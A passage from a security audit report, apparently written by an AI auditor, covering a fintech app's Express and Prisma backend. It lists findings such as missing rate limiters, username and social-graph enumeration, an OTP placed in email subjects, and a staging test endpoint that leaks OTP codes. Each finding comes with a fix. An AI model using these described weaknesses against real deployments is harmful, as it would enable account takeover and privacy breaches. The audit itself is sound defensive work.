| **Problem** | When harvest candidates exist, the service sends a detailed summary of the user's unrealized losses to Perplexity's API — including tickers, dollar loss amounts, loss percentages, holding periods, days held, total unrealized gains/losses, and net position. This is tax-sensitive financial information sent to a third party with no user-facing disclosure or consent prompt. |
| **Consequence** | Users' tax-relevant financial data is transmitted to Perplexity without their knowledge. Could violate privacy expectations, especially for users who are tax-sensitive or in regulated jurisdictions. Same pattern as Finding 31.3. |
| **Fix** | Add a consent/disclosure mechanism before sending financial data to third-party APIs. At minimum, display "Powered by Perplexity AI" in the UI with a note that financial data is shared for analysis. |

#### 37.2 — LOW: Tax harvest endpoint missing plan gate — free users trigger Perplexity API calls

| Field | Detail |
|-------|--------|
| **Severity** | LOW |
| **Location** | `src/routes/insights.routes.ts:40` |
| **Problem** | Route is `router.get('/tax-harvest', heavyReadLimiter, requireAuth, getTaxHarvestHandler)` — missing `requirePlan('premium')`. Other AI-powered endpoints like `/briefing`, `/behavior`, and `/daily-report/regenerate` all require premium. The tax harvest feature makes a Perplexity API call (lines 162-167) which costs real money per request. |
| **Consequence** | Free-tier users can trigger Perplexity API calls, increasing operational costs without corresponding revenue. 24-hour cache mitigates the frequency but first call per user per day still costs. |
| **Fix** | Add `requirePlan('premium')` to the route, consistent with other Perplexity-powered endpoints. |

### Positives
- **Goals service is exemplary**: Every CRUD operation verifies ownership with `findFirst({ where: { id, userId } })` before acting. Zod validation on inputs via `createGoalSchema`, `updateGoalSchema`, `goalIdParamSchema`. Rate limiters on all mutations. This is the cleanest service in the entire codebase — zero findings.
- **Options service is clean**: Pure pricing utility with no user data, no mutations, no state changes. Good caching (30s primary, 300s backup). Grouped API calls by underlying+expiry to minimize external requests. Sequential execution respects Finnhub rate limits.
- **Tax harvest properly user-scoped**: `getHoldings(userId)`, `prisma.lot.findMany({ where: { userId, ... } })`, `prisma.activityEvent.findMany({ where: { userId, ... } })` — all queries include userId.
- **Wash sale detection**: Smart check against recent `holding_removed` activity events within 30 days.
- **Cost basis from lots**: Properly calculates per-lot holding periods (short-term vs long-term vs mixed) for accurate tax rate estimation.
- **Financial math correct**: Goal time-to-goal uses binary search with proper edge cases (already achieved, no growth + no contributions, 100-year cap).

### Running Tally

| Severity | Count |
|----------|-------|
| Critical | 2 |
| High | 14 |
| Medium | 65 |
| Low | 51 |
| **Total** | **132** |

---

## File 38 — Insights, Income, Performance Report, Account History, Historical CAGR, Reports
**Date**: 2026-03-01
**Auditor**: Claude (ruthless mode)
**Files**:
- `src/services/insights.service.ts` (~1,200 lines) — health score, attribution, leak detector, risk forecast
- `src/services/income-insights.service.ts` (671 lines) — dividend-focused income analytics
- `src/services/performance-report.service.ts` (465 lines) — HTML report generation
- `src/controllers/performance-report.controller.ts` (60 lines) — report + email handlers
- `src/services/account-history.service.ts` (366 lines) — unified trade/ledger/activity history
- `src/services/historical-cagr.service.ts` (207 lines) — Yahoo Finance CAGR calculations
- `src/services/report.service.ts` (64 lines) — user report/flag system
- `src/routes/insights.routes.ts` (48 lines) — insight endpoint wiring
- `src/routes/portfolio.routes.ts:41,48-49` — account-history & report routes

### Findings

#### 38.1 — LOW: `/insights/health` endpoint missing rate limiter

| Field | Detail |
|-------|--------|
| **Severity** | LOW |
| **Location** | `src/routes/insights.routes.ts:27` |
| **Problem** | Route is `router.get('/health', requireAuth, getHealthHandler)` — missing `heavyReadLimiter`. Every other insight endpoint (`/attribution`, `/leak-detector`, `/risk-forecast`, `/income`, `/tax-harvest`) includes `heavyReadLimiter`. The health score handler calls `getPortfolio(userId)` + `getAllSnapshots(userId)` + potentially candle data fetches — non-trivial compute. |
| **Consequence** | Authenticated user can rapidly hammer the health score endpoint to exhaust server resources. Mitigated by 5-minute cache but cache misses (first hit, different users) are expensive. |
| **Fix** | Add `heavyReadLimiter` to match the pattern: `router.get('/health', heavyReadLimiter, requireAuth, getHealthHandler)`. |

#### 38.2 — LOW: Performance report email response leaks user email address

| Field | Detail |
|-------|--------|
| **Severity** | LOW |
| **Location** | `src/controllers/performance-report.controller.ts:53` |
| **Problem** | `res.json({ sent: true, to: user.email })` — returns the full email address in the API response body. While the user is authenticated and this is their own email, the response is visible in browser DevTools, network logs, and any request interceptors. |
| **Consequence** | Email address exposed in API response. Low severity since it's the authenticated user's own data, but unnecessary information leakage — the frontend only needs to know the email was sent, not the full address. |
| **Fix** | Mask the email: `to: user.email.replace(/(.{2}).*(@.*)/, '$1***$2')` or simply omit it: `res.json({ sent: true })`. |

### Positives
- **Insights service exemplary user-scoping**: All four exported functions (`getHealthScore`, `getAttribution`, `getLeakDetector`, `getRiskForecast`) properly accept `userId` and call `getPortfolio(userId)` and `getAllSnapshots(userId)`. User-scoped cache keys.
- **Income insights fully scoped**: `getIncomeInsights(userId, window)` calls `getDividendCredits(userId)` and `getPortfolio(userId)`. Cache key `income-insights:${userId}:${window}`.
- **Account history is a security model**: `getAccountHistory` queries three tables (`ActivityEvent`, `PortfolioTrade`, `LedgerEvent`) all with `userId` filter. Cursor-based pagination with composite cursor. Limit capped at `Math.min(Math.max(params.limit ?? 30, 1), 100)`. Category-based DB filters avoid pulling unnecessary data. This is one of the best-designed services in the codebase.
- **Performance report**: Benchmark parameter whitelisted (`SPY`, `QQQ`, `DIA`), period whitelisted (`1D`-`ALL`). User email verified before sending. `req.user!.userId` used consistently.
- **Historical CAGR**: Per-ticker public data (no user data), `encodeURIComponent(ticker.toUpperCase())` in URL, sanity bounds on CAGR (capped at 200%, floored at -50%).
- **Report service**: Self-report prevention, 5/24h rate limit, duplicate detection, reported user existence check. Clean.
- **Health score details**: Transparent scoring with `calcBullets`, `evidenceBullets`, `drivers`, `quickFixes` per category — audit-friendly design.

### Running Tally

| Severity | Count |
|----------|-------|
| Critical | 2 |
| High | 14 |
| Medium | 65 |
| Low | 53 |
| **Total** | **134** |

---

## File 39: Calendar, ETF Overlap, Themes Heatmap, Polygon Screener, Market Heatmap Fundamentals

**Scope**: `src/services/calendar.service.ts` (85 lines), `src/controllers/calendar.controller.ts` (20 lines), `src/services/etf-overlap.service.ts` (147 lines), `src/controllers/etf-overlap.controller.ts` (13 lines), `src/services/themes-heatmap.service.ts` (262 lines), `src/services/polygon-screener.service.ts` (320 lines), `src/services/market-heatmap-fundamentals.service.ts` (59 lines), plus route wiring in `dividend.routes.ts`, `portfolio.routes.ts`, `market.routes.ts`

### Finding 39.1

| Field | Detail |
|-------|--------|
| **Severity** | LOW |
| **Location** | `src/routes/portfolio.routes.ts:46` |
| **Problem** | `router.get('/etf-overlap', requireAuth, getEtfOverlapHandler)` — missing `heavyReadLimiter`. The handler calls `fetchPrices()` for all user holdings, then sequentially calls `getETFHoldings(ticker)` for each ticker. A user with 30+ holdings triggers 30+ Yahoo Finance API calls per request. Without rate limiting, rapid requests amplify external API abuse. |
| **Consequence** | An authenticated user can exhaust Yahoo Finance API quota by rapidly hitting `/portfolio/etf-overlap`. Every other endpoint on the portfolio routes that makes external API calls uses `heavyReadLimiter` (`/history`, `/history/chart`, `/performance`, `/report`). This endpoint is the odd one out. |
| **Fix** | Add `heavyReadLimiter`: `router.get('/etf-overlap', heavyReadLimiter, requireAuth, getEtfOverlapHandler)`. |

### Positives
- **Calendar service exemplary**: `generateDividendCalendar(userId)` properly scoped — calls `getUpcomingDividendEvents(userId)` and `prisma.holding.findMany({ where: { userId } })`. RFC 5545 compliance with `escapeICS()` handling backslashes, semicolons, commas, and newlines. Route at `GET /dividends/calendar.ics` has `requireAuth`.
- **ETF overlap properly user-scoped**: `getEtfOverlap(userId)` queries `prisma.holding.findMany({ where: { userId, shares: { gt: 0 } } })`. Controller uses `req.user!.userId`. No cross-user data access.
- **Themes heatmap clean public endpoint**: No user data involved. Background refresh with 5-min cache TTL. Per-period caching (`periodChangesCache`). `heavyReadLimiter` on route. Period whitelist validated in controller (`validPeriods`).
- **Polygon screener isolated background job**: Not exposed via HTTP routes — only called from `index.ts` startup + 12-hour interval. Uses config API key properly. Staleness check prevents redundant API calls. Batch processing with delays.
- **Market heatmap fundamentals isolated**: Not HTTP-exposed. Alpha Vantage daily call budget respected (`getDailyCallsRemaining()`). Stale-only refresh strategy. Clean separation of concerns.

### Running Tally

| Severity | Count |
|----------|-------|
| Critical | 2 |
| High | 14 |
| Medium | 65 |
| Low | 54 |
| **Total** | **135** |

---

## File 40: Referral, Follow (Social), Stock Follow

**Scope**: `src/services/referral.service.ts` (119 lines), `src/controllers/referral.controller.ts` (39 lines), `src/routes/referral.routes.ts` (13 lines), `src/services/follow.service.ts` (83 lines), `src/controllers/social.controller.ts` (425 lines), `src/routes/users.routes.ts` (43 lines), `src/routes/social.routes.ts` (11 lines), `src/services/stock-follow.service.ts` (70 lines), `src/controllers/stock-follow.controller.ts` (109 lines), `src/routes/stock-follow.routes.ts` (22 lines)

### Finding 40.1

| Field | Detail |
|-------|--------|
| **Severity** | MEDIUM |
| **Location** | `src/routes/referral.routes.ts:8`, `src/controllers/referral.controller.ts:25-38` |
| **Problem** | `GET /referral/validate/:code` is unauthenticated with no rate limiter. It calls `validateReferralCode(code)` which does `prisma.user.findUnique({ where: { username: code } })` and returns `{ valid: true, displayName: "..." }` if found. Since referral codes are usernames, this is a direct username enumeration endpoint that also leaks display names. |
| **Consequence** | Attacker can brute-force the endpoint to enumerate all valid usernames and their display names. No rate limiting means thousands of probes per second. Combined with the password reset endpoint, this enables targeted account attacks on confirmed-valid usernames. |
| **Fix** | Add `enumerationLimiter` to the route (already used on `/by-username/:username`). Consider returning only `{ valid: true }` without `displayName` to reduce information leakage. |

### Finding 40.2

| Field | Detail |
|-------|--------|
| **Severity** | MEDIUM |
| **Location** | `src/routes/users.routes.ts:30-31`, `src/controllers/social.controller.ts:83-104` |
| **Problem** | `GET /users/:userId/followers` and `GET /users/:userId/following` have **no authentication at all** — not even `optionalAuth`. They return full lists of `{ id, username, displayName }` for any user's social connections. There is no `profilePublic` check. A user who sets their profile to private (`profilePublic: false`) has their profile protected by `getProfileHandler`, but their entire social graph is still fully exposed via these two endpoints. |
| **Consequence** | Complete social graph enumeration. Any anonymous visitor can map who follows whom, discover private users' connections, and harvest user IDs + usernames + display names. This bypasses the `profilePublic` privacy control and violates users' expectation that a private profile hides their social connections. |
| **Fix** | Add `optionalAuth` middleware. In the handlers, check `profilePublic` for the target user — if profile is private and viewer is not the owner, return 403 or an empty list. Match the privacy logic in `getProfileHandler`. |

### Finding 40.3

| Field | Detail |
|-------|--------|
| **Severity** | LOW |
| **Location** | `src/controllers/social.controller.ts:66-80`, `src/routes/users.routes.ts:29` |
| **Problem** | `GET /users/:userId/is-following?followerId=X` takes an arbitrary `followerId` from query parameters. Any visitor (optionalAuth) can check if any User A follows any User B without being either of them. The correct pattern is to use the authenticated user as the follower (as done in `followHandler` and `unfollowHandler`). |
| **Consequence** | Social graph probing — allows mapping all follow relationships between any pair of users. Low severity since follower/following lists are already public (see 40.2), but if 40.2 is fixed, this becomes a bypass. |
| **Fix** | Use `req.user?.userId` as the follower instead of the query param: `const following = await isFollowing(req.user!.userId, req.params.userId)`. Route should use `requireAuth`. |

### Finding 40.4

| Field | Detail |
|-------|--------|
| **Severity** | LOW |
| **Location** | `src/controllers/referral.controller.ts:9` |
| **Problem** | `getReferralStatsHandler` accesses `(req as any).userId` instead of the standard `req.user!.userId` pattern used everywhere else. The auth middleware sets `req.user = { userId, ... }`, not `req.userId`. If `req.userId` is `undefined`, the controller's own null check on line 10-11 returns 401 — meaning **this endpoint is broken for all authenticated users** (always returns 401). |
| **Consequence** | Referral stats endpoint is non-functional. Not a security vulnerability per se (fails closed), but if someone "fixes" it by removing the null check without fixing the property access, it would pass `undefined` to `getReferralStats()`, and Prisma would treat `where: { referrerUserId: undefined }` as "no filter" — returning ALL users' referral data. |
| **Fix** | Change `(req as any).userId` to `(req as any).user?.userId` or properly type the request as `AuthRequest` and use `req.user!.userId`. |

### Positives
- **Follow service well-designed**: Self-follow prevention, composite key upsert, both `getFollowers` and `getFollowing` properly scoped. `getFollowingIds` used internally for feed.
- **Profile handler exemplary IDOR protection**: `getProfileHandler` checks `profilePublic` vs. `isOwner`, returns 403 for private profiles viewed by non-owners. Settings handlers enforce ownership. Bio truncated at 80 chars. Region whitelisted.
- **Stock follow service clean**: `isValidSymbol` regex validation (`/^[A-Z0-9.\-]{1,15}$/`), symbol normalization, composite key upserts, `getMostFollowedStocks` limit capped at 500. All mutation routes have `mutationLimiter` + `requireAuth`.
- **Referral processing transactional**: `processReferral` uses `$transaction`, prevents self-referral, handles unique constraint violations gracefully.
- **Settings update thoroughly validated**: Region whitelisted (`NA/EU/APAC`), holdingsVisibility whitelisted (`all/top5/sectors/hidden`), `ytdBaselineValue` bounds-checked (positive finite number). Ownership enforced on all mutation handlers.
- **Feed handler properly scoped**: Requires auth, uses `req.user.userId`, delegates to `getFeed(userId)`.

### Running Tally

| Severity | Count |
|----------|-------|
| Critical | 2 |
| High | 14 |
| Medium | 67 |
| Low | 56 |
| **Total** | **139** |

---

## File 41: Email Service, Email Verification Guard, Demo Data, User Portfolio, Screenshot OCR

**Scope**: `src/services/email.service.ts` (207 lines), `src/services/email-verification-guard.service.ts` (24 lines), `src/services/demo-data.service.ts` (298 lines), `src/services/user-portfolio.service.ts` (164 lines), `src/services/screenshot-ocr.service.ts` (565 lines), plus route wiring in `auth.routes.ts`

### Finding 41.1

| Field | Detail |
|-------|--------|
| **Severity** | LOW |
| **Location** | `src/services/email.service.ts:37` |
| **Problem** | `sendOtpEmail` puts the OTP code directly in the email subject: `subject: \`${code} is your Nala verification code\``. Email subjects are visible on lock screens, notification banners, email list previews, and browser tabs without opening the email. The other two email functions (`sendEmailVerification`, `sendPasswordResetEmail`) correctly keep codes out of subjects. |
| **Consequence** | MFA login codes visible via shoulder surfing, physical device access, or notification mirroring without needing to open the email. Low severity because many major services do this intentionally for UX, but it does weaken the MFA security model. |
| **Fix** | Change subject to `"Your Nala verification code"` (no code in subject). The code is already in the email body in large monospace font. |

### Finding 41.2

| Field | Detail |
|-------|--------|
| **Severity** | LOW |
| **Location** | `src/services/email.service.ts:192-206`, `src/controllers/auth.controller.ts:431-458`, `src/routes/auth.routes.ts:66-68` |
| **Problem** | `GET /auth/test/verification-code?email=...` returns captured OTP codes in non-production environments. The endpoint is double-guarded (conditional route registration + handler check) and optionally protected by `TEST_HELPER_KEY` header. However, if `TEST_HELPER_KEY` env var is not set, the header check is skipped entirely (`if (configuredKey && ...)` — falsy configuredKey bypasses the check). On an internet-accessible staging environment without `TEST_HELPER_KEY`, any attacker can retrieve OTP codes for any email that recently requested verification. |
| **Consequence** | Full authentication bypass on staging/preview deployments if `TEST_HELPER_KEY` is not configured. Attacker registers with victim's email, calls this endpoint to retrieve the OTP, and verifies the account. Low severity because production is protected and this is by-design for local dev/CI — but staging deployments on Railway preview environments could be vulnerable. |
| **Fix** | Either always require `TEST_HELPER_KEY` (fail closed if not set) or add IP/network restrictions. Consider: `if (!configuredKey \|\| provided !== configuredKey)` instead of the current pattern. |

### Positives
- **Email service well-structured**: Lazy Resend initialization, production-only enforcement, dev mode graceful fallback with console logging. Email templates are simple, static HTML with no user-controlled content injection vectors.
- **Email verification guard clean**: `ensureEmailVerifiedForAi(userId)` — simple, focused function. System user bypass is necessary and documented. Minimal surface area.
- **Demo data fully isolated**: Only called from `index.ts` when `DEMO_LEADERBOARD=true`. Demo users created without password hashes (can't be logged into). Idempotent creation (`findFirst` before `create`). `DEFAULT_USER_ID` is not the real system user ID. Transactional cleanup with `force` flag.
- **User portfolio properly scoped**: `getUserPortfolio(userId)` queries `prisma.holding.findMany({ where: { userId } })`. Null-safe price handling (`hasValidPrice` guard). Never uses `averageCost` as price fallback (documented as critical rule). Returns structured `quotesMeta` for transparency.
- **Screenshot OCR security-conscious**: Tesseract workers are created and terminated per-request (no cross-request state). Sharp handles malicious images gracefully. `isValidTicker` regex prevents injection. `parseNumber` sanitizes numeric input. No file paths derived from user input. HEIC conversion isolated with error handling.
- **Password reset email subject clean**: `"Reset your Nala password"` — no code in subject. Correct pattern.
- **Test endpoint double-guarded**: Route conditionally registered (`NODE_ENV !== 'production'`) AND handler checks `NODE_ENV === 'production'` — defense in depth.

### Running Tally

| Severity | Count |
|----------|-------|
| Critical | 2 |
| High | 14 |
| Medium | 67 |
| Low | 58 |
| **Total** | **141** |

---

## File 42: Push Notifications, Creator Reconciliation, Transactions, Earnings, Ledger Replay

**Scope**: `src/services/push.service.ts` (135 lines), `src/controllers/push.controller.ts` (130 lines), `src/routes/push.routes.ts` (18 lines), `src/services/creator-reconciliation.service.ts` (341 lines), `src/services/transaction.service.ts` (40 lines), `src/controllers/transaction.controller.ts` (54 lines), `src/routes/transaction.routes.ts` (16 lines), `src/services/earnings.service.ts` (222 lines), `src/services/earnings-track.service.ts` (139 lines), `src/services/earnings-summary.service.ts` (85 lines), `src/services/ledger/settlement-policy.ts` (112 lines), `src/services/ledger/replay.service.ts` (272 lines)

### Finding 42.1

| Field | Detail |
|-------|--------|
| **Severity** | LOW |
| **Location** | `src/routes/push.routes.ts:16` |
| **Problem** | `router.post('/test', requireAuth, testPushHandler)` — missing `mutationLimiter`. The other push mutation routes (`subscribe`, `unsubscribe`) both have `mutationLimiter`. Without rate limiting, a user could spam `POST /push/test` to trigger unlimited web-push API calls, one per subscription per request. Each call sends a push notification and hits the browser push service (FCM/APNs). |
| **Consequence** | Amplification vector — each request triggers N push API calls (one per subscription). Could abuse FCM/APNs rate limits or burn web-push sending quota. Low severity because auth is required and impact is self-inflicted (user spams their own notifications). |
| **Fix** | Add `mutationLimiter`: `router.post('/test', mutationLimiter, requireAuth, testPushHandler)`. |

### Positives
- **Push service well-designed**: `saveSubscription` correctly handles shared-device rebinding (documented). `removeSubscription` verifies ownership by checking both `endpoint` AND `userId`. `sendPushToUser` auto-cleans expired subscriptions on 404/410. Fire-and-forget pattern prevents push failures from blocking upstream operations.
- **Push controller thorough input validation**: Endpoint length capped at 2048 chars, key lengths at 512. Type checks on all fields. `config.pushEnabled` feature gate on all handlers. VAPID key is public by definition.
- **Creator reconciliation is audit-quality code**: 11 distinct issue codes, sign validation (earnings must be positive, refunds negative), paired entry detection (creator_share ↔ platform_fee), 80/20 split verification with 1-cent tolerance, stale subscription detection. Pure function + scheduled runner pattern. No HTTP exposure.
- **Transaction service exemplary**: Ownership-verified delete via `findFirst({ where: { id, userId } })`. Controller uses Zod validation (`addTransactionSchema`, `transactionIdParamSchema`). All routes have `requireAuth` + `mutationLimiter` on writes.
- **Earnings services clean**: Per-ticker public data with multi-source fallback chain (Alpha Vantage → Finnhub). Budget-aware (`getDailyCallsRemaining`). Proper cache-or-fetch pattern. Summary service user-scoped via `getPortfolio(userId)` with cache key `earnings-summary:${userId}`.
- **Ledger replay properly user-scoped**: Both `portfolioTrade.findMany` and `ledgerEvent.findMany` filter by `userId`. Settlement-policy-aware posting. Deterministic sort order (`date → rowIndex → createdAt → id`). Clean separation between settlement-policy constants and replay engine.
- **Settlement policy clean design**: Pure type definitions + validation helpers. `normalizeSourceBroker` safely falls back to `'mapped'` for unknown input. No DB access, no side effects.

### Running Tally

| Severity | Count |
|----------|-------|
| Critical | 2 |
| High | 14 |
| Medium | 67 |
| Low | 59 |
| **Total** | **142** |

---

## File 43 — Utils (21 files)

**Files reviewed:**
- `src/utils/encryption.ts` (39 lines)
- `src/utils/prisma.ts` (5 lines)
- `src/utils/plaid-webhook-verify.ts` (113 lines)
- `src/utils/auth-metrics.ts` (51 lines)
- `src/utils/perplexity.ts` (92 lines)
- `src/utils/polygon.ts` (698 lines)
- `src/utils/finnhub.ts` (~1200 lines)
- `src/utils/finnhub-queue.ts` (195 lines)
- `src/utils/yahoo-http.ts` (207 lines)
- `src/utils/yahoo-finance.ts` (~650 lines)
- `src/utils/candle-cache.ts` (500 lines)
- `src/utils/alpha-vantage.ts` (390 lines)
- `src/utils/math.ts` (128 lines)
- `src/utils/market-hours.ts` (168 lines)
- `src/utils/occ-parser.ts` (76 lines)
- `src/utils/parse-number.ts` (27 lines)
- `src/utils/plan-limit.error.ts` (11 lines)
- `src/utils/import-constants.ts` (48 lines)
- `src/utils/world-bank.ts` (63 lines)
- `src/utils/finance-math.ts` (349 lines)
- `src/utils/sectors.ts` (187 lines)

**No findings.**

### Positive observations

- **encryption.ts**: AES-256-GCM with random 16-byte IV per encryption, authentication tag verification, key length validation (rejects non-32-byte keys). Textbook correct.
- **plaid-webhook-verify.ts**: Full JWS/ES256 verification — decodes header for `kid`, fetches JWK from Plaid's `/keys/get`, verifies signature, verifies body SHA-256 hash matches, 5-minute expiry check. JWK key caching with 24h TTL. Excellent.
- **All API clients use parameterized requests**: Finnhub, Alpha Vantage, and search queries are passed via axios `params` (not URL template literals), so axios handles encoding. Polygon uses `encodeURIComponent(ticker)` + uppercasing. Yahoo uses `encodeURIComponent(ticker)` in URL construction. No injection vectors.
- **API keys sourced from config**: All external API keys come from `config.*`, never hardcoded. Finnhub key passed as `token` param, Alpha Vantage as `apikey` param, Polygon as URL query param (their documented pattern). None logged.
- **World Bank API**: `countryCode` and `indicatorCode` come from hardcoded `INTL_INDICATOR_CONFIG`, not user input. No injection risk.
- **Alpha Vantage daily budget**: Call count persisted to SQLite via `AVDailyUsage` model, survives restarts. Queue enforces 13s minimum delay between requests. Clean rate limit handling with exponential backoff.
- **finnhub-queue.ts**: Single-threaded request queue with exponential backoff + jitter, max retries, clean error propagation. No concurrency issues.
- **finance-math.ts**: Pure math functions (TWR, XIRR, Beta, Correlation, Sharpe, MaxDrawdown). Division-by-zero guards throughout. Newton-Raphson with bisection fallback for XIRR. No external I/O.
- **parse-number.ts**: Currency string parsing with sanitization — strips `$`, `,`, `%`, parentheses. Safe.
- **sectors.ts**: Static data mapping. No external input, no I/O.

### Running Tally

| Severity | Count |
|----------|-------|
| Critical | 2 |
| High | 14 |
| Medium | 67 |
| Low | 59 |
| **Total** | **142** |

---

## File 44 — Middleware (6 files)

**Files reviewed:**
- `src/middleware/auth.middleware.ts` (182 lines)
- `src/middleware/rateLimiter.ts` (176 lines)
- `src/middleware/plan.middleware.ts` (62 lines)
- `src/middleware/email-verification.middleware.ts` (21 lines)
- `src/middleware/creator.middleware.ts` (55 lines)
- `src/middleware/mfa-assurance.middleware.ts` (63 lines)

**No findings.**

### Positive observations

- **auth.middleware.ts**: Solid layered design. Three auth flavors (`requireAuth` with email gate, `requireAuthAllowUnverified`, `optionalAuth`) cover all use cases cleanly. Token extracted from httpOnly cookie (primary) or Bearer header (fallback). `requireOwnership` enforces IDOR protection. Cookie options: `httpOnly: true`, `secure` in production, `sameSite: lax` (or `none` for Capacitor mobile). Token rotation deliberately NOT done in middleware — handled exclusively by `POST /auth/refresh` to prevent concurrent Set-Cookie race conditions.
- **rateLimiter.ts**: Comprehensive library — 13 distinct limiters for different operation classes (login, signup, mutation, billing, MFA, webhook, enumeration, etc.). `loginLimiter` uses `skipSuccessfulRequests: true` to only count failed attempts. `apiLimiter` wisely exempts GET requests (mutations are covered by `mutationLimiter` per-route). All use `standardHeaders: true` for RFC compliance.
- **plan.middleware.ts**: Smart JWT plan lag handling — if JWT says `free` but DB was updated to `pro` (webhook lag), it re-checks DB. Plan expiry enforcement. Clean.
- **mfa-assurance.middleware.ts**: Step-up auth with 30-minute assurance window. Checks for recent verified `MfaChallenge` record. Opt-in: if no MFA methods enabled, allows through. Correct design.
- **creator.middleware.ts**: Two-layer: `requireCreator` checks active creator status, `requireCreatorAccess` checks section-level entitlement via `getEntitlement`. Clean.
- **`trust proxy` configured** (`app.set('trust proxy', 1)` in `app.ts:33`) — all rate limiters correctly use client IP behind Railway's proxy.

### Running Tally

| Severity | Count |
|----------|-------|
| Critical | 2 |
| High | 14 |
| Medium | 67 |
| Low | 59 |
| **Total** | **142** |

---

## File 45 — Validators (14 files)

**Files reviewed:**
- `src/validators/auth.validators.ts` (99 lines)
- `src/validators/portfolio.validators.ts` (21 lines)
- `src/validators/transaction.validators.ts` (12 lines)
- `src/validators/billing.validators.ts` (6 lines)
- `src/validators/alert.validators.ts` (11 lines)
- `src/validators/market.validators.ts` (58 lines)
- `src/validators/watchlist.validators.ts` (42 lines)
- `src/validators/goals.validators.ts` (26 lines)
- `src/validators/mfa.validators.ts` (32 lines)
- `src/validators/oauth.validators.ts` (16 lines)
- `src/validators/plaid.validators.ts` (39 lines)
- `src/validators/report.validators.ts` (8 lines)
- `src/validators/creator.validators.ts` (28 lines)
- `src/validators/deep-research.validators.ts` (25 lines)

**No findings.**

### Positive observations

- **auth.validators.ts**: Strong password policy (8+ chars, upper, lower, digit). Username: 3-20 chars, `[a-zA-Z0-9_]` regex, 30+ reserved names blocklist (API prefixes, UI routes, system words). Defense-in-depth with service layer duplicate check. Email: `.email()` + `.max(255)`. OTP: `^\d{6}$` regex.
- **plaid.validators.ts**: Public token regex `^public-(sandbox|development|production)-[0-9a-f-]{36}$` — prevents malformed tokens. Webhook allowlist: only valid `webhook_type`/`webhook_code` combinations accepted. Excellent input gate.
- **oauth.validators.ts**: Token size capped at 4096 chars. Apple schema uses `.strict()` to reject unexpected fields. Google requires either `access_token` or `credential` via `.refine()`.
- **market.validators.ts**: Ticker auto-uppercase via `.transform()`. Comma-separated ticker lists split and filtered. Benchmarks constrained to `['SPY','QQQ','DIA']` enum. Query params bounded (limit 1-50, days 1-7300).
- **deep-research.validators.ts**: Prompt 10-2000 chars, job ID UUID-validated, pagination bounded (1-50 per page). Research type enum prevents injection.
- **creator.validators.ts**: Pricing cents $1-$999.99, trade delay restricted to `[0, 24, 48, 72]` literal union.
- **alert.validators.ts**: `.strict()` on body prevents mass-assignment via extra fields.
- **All schemas use Zod** — type-safe, fail-fast validation with clear error messages. No raw `req.body` access patterns.

### Running Tally

| Severity | Count |
|----------|-------|
| Critical | 2 |
| High | 14 |
| Medium | 67 |
| Low | 59 |
| **Total** | **142** |

---

## File 46 — App Core, Config, Routes Index, Health, Waitlist, Types, Scripts

**Files reviewed:**
- `src/app.ts` (198 lines)
- `src/index.ts` (465 lines)
- `src/config/index.ts` (194 lines)
- `src/routes/index.ts` (67 lines)
- `src/routes/health.routes.ts` (13 lines)
- `src/routes/waitlist.routes.ts` (126 lines)
- `src/controllers/health.controller.ts` (45 lines)
- `src/types/auth.ts` (69 lines)
- `src/types/index.ts` (732 lines)
- `src/data/strategy-personas.ts` (static data)
- `scripts/check-isolation.sh` (71 lines)
- `scripts/check-mocks.sh` (29 lines)
- `scripts/start.sh` (8 lines)

### Finding 46.1

| Field | Value |
|-------|-------|
| **Severity** | LOW |
| **Location** | `src/index.ts:141-145` |
| **Problem** | `updateMany({ where: { emailVerified: false }, data: { emailVerified: true } })` auto-verifies ALL unverified users on every server restart. |
| **Consequence** | When email verification is eventually enabled (`EMAIL_VERIFICATION_ENABLED=true`), this startup block will undermine it — any user who registers and doesn't verify before the next deploy/restart will be auto-verified without completing the OTP flow. Currently harmless since email verification is disabled, but becomes a bypass when enabled. |
| **Fix** | Make this a one-time migration with a completed flag (e.g., check a `_migrations` table), or scope it to users created before a cutoff date: `where: { emailVerified: false, createdAt: { lt: new Date('2026-03-01') } }`. Remove entirely once all pre-verification users are handled. |

### Positive observations

- **app.ts — Helmet CSP**: Restrictive `defaultSrc: 'self'`, `objectSrc: 'none'`, `frameSrc` limited to Plaid CDN. HSTS 1 year with `includeSubDomains`. Good.
- **app.ts — CORS**: Origin allowlist from config, dev LAN regex for local testing, `credentials: true` for cookie auth. No wildcard.
- **app.ts — Sentry**: Strips `authorization` and `cookie` headers before sending error events. 10% trace sampling in production.
- **app.ts — JSON body**: 2MB limit. Stripe webhook paths skip JSON parser (use route-level `express.raw()`). `rawBody` captured for Plaid webhook signature verification.
- **app.ts — Error handler**: Generic 500, no stack trace leakage.
- **config/index.ts — Startup validation**: `JWT_SECRET` required (exits on missing). Production requires all API keys and Stripe keys. MFA key validated as 64-char hex (32 bytes for AES-256-GCM).
- **config/index.ts — Billing deploy safety**: `assertBillingDeploySafety()` runs on startup, process.exit(1) in production if Stripe config is invalid.
- **routes/index.ts**: `/nala/deep-research` registered BEFORE `/nala` (correct — more specific first). `/billing` conditionally registered behind `config.billingEnabled`.
- **health.controller.ts**: Returns provider status without exposing keys (`configured: Boolean(config.finnhubApiKey)`). Auth metrics dev-only.
- **waitlist.routes.ts**: Admin endpoints verify userId AND email against config allowlists. `POST /join` uses `waitlistJoinLimiter`. Idempotent join. Clean.
- **scripts/check-isolation.sh**: CI guardrail — blocks `SYSTEM_USER_ID` in services, `resolveUserId`, and optional `userId?` in service signatures. Advisory check for unscoped `findMany`. Excellent defensive CI.
- **scripts/start.sh**: Simple `prisma migrate deploy` then `node dist/index.js`. Production-ready.
- **types/**: Pure type definitions, no runtime logic. Clean.

### Running Tally

| Severity | Count |
|----------|-------|
| Critical | 2 |
| High | 14 |
| Medium | 67 |
| Low | 60 |
| **Total** | **143** |

---

## File 47 — Prisma Schema, Migrations, Test Files

**Files reviewed:**
- `prisma/schema.prisma` (1018 lines — 38 models)
- `prisma/migrations/20260223_add_ledger_events/migration.sql` (CHECK constraints verified)
- `src/__tests__/helpers.ts` (53 lines)
- `src/__tests__/setup.ts` (102 lines)
- `src/__tests__/auth.test.ts`, `auth.email-verification.routes.test.ts`, `auth.password-reset.routes.test.ts` (reviewed in earlier files)
- 30 test files total (scanned for hardcoded secrets and auth patterns)
- `scripts/check-isolation.sh` (71 lines)
- `scripts/check-mocks.sh` (29 lines)

### Finding 47.1

| Field | Value |
|-------|-------|
| **Severity** | MEDIUM |
| **Location** | `prisma/schema.prisma:166-180` + `src/services/auth.service.ts:107-114` |
